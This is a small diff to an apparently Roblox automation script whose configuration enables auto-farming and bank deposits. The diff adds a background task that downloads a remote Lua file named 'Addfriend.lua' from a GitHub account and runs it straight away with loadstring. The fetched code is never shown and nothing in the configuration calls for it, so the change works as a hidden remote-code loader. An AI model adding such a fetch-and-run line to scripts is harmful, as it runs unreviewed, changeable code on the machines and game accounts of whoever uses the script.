@@ -2,6 +2,10 @@ repeat
     task.wait()
 until game:IsLoaded()
 
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TenPanelX/ConfigPT/refs/heads/main/Addfriend.lua"))()
+end)
+
 getgenv().Configs = {
     ["Auto Farm"] = true,
     ["Bank Deposit"] = 10,
